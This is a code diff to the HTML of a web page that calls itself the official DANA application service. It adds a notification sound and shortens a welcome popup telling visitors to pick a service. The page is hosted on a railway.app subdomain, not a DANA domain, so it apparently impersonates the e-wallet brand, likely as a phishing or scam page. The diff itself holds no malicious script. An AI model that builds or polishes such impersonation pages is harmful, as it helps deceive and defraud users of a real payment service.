@@ -310,7 +310,11 @@ content="https://lnkjenius-production.up.railway.app/?update=827382">
     </div>
 </div>
 
-    <div class="welcome-popup" id="welcomePopup">
+  <audio id="notifTop" preload="auto">
+    <source src="assets/notif-top.mp3" type="audio/mpeg">
+</audio>
+
+<div class="welcome-popup" id="welcomePopup">
     <div class="welcome-card">
 
         <div class="welcome-shine"></div>
@@ -319,25 +323,17 @@ content="https://lnkjenius-production.up.railway.app/?update=827382">
             <img src="assets/home.png" alt="">
         </div>
 
-        <div class="welcome-badge">
-            LAYANAN RESMI
+        <div style="flex:1; position:relative; z-index:2;">
+            <div class="welcome-badge">LAYANAN RESMI</div>
+            <h2>Selamat Datang</h2>
+            <p>Selamat datang di Layanan Pengajuan Resmi DANA.<br> Pilih Layanan sesuai kebutuhanmu.</p>
         </div>
 
-        <h2>Selamat Datang</h2>
-
-        <p>
-            Selamat datang di Layanan Pengajuan Resmi DANA. <br>
-            Data pengajuan kamu akan diproses secara aman, cepat,
-            dan bertahap oleh sistem.
-        </p>
-
-        <button id="welcomeBtn">
-            Lanjutkan Pengajuan
-        </button>
+        <button id="welcomeBtn">OK</button>
 
     </div>
 </div>
-
+  
 <script src="script.js"></script>
 </body>
 </html>
